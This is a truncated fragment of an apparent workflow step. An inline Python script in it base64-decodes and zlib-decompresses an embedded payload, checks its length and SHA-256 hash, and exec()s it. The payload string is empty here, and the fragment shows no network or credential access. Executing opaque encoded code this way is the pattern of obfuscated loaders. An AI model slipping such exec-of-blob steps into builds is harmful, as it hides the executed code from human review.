      run: "python3 - <<'PY'\nimport base64,hashlib,zlib,pathlib\nPAYLOAD=''\n\
        d=zlib.decompressobj();raw=d.decompress(base64.b64decode(PAYLOAD,validate=True),58405)\nassert len(raw)==58404\
        \ and d.eof and not d.unused_data and not d.unconsumed_tail and hashlib.sha256(raw).hexdigest()=='fa0581b5f7fd5b29bbcdf74166b11edee1dddc95c9b4f7012f3ce82fb279a6ef'\n\
        try:exec(compile(raw,'<owned-gl-composition-v1-inspect>','exec'),{'__name__':'__main__'})\nfinally:\n root=pathlib.Path('.work/cod-gl-stack-borrow-v1a').absolute()\n\
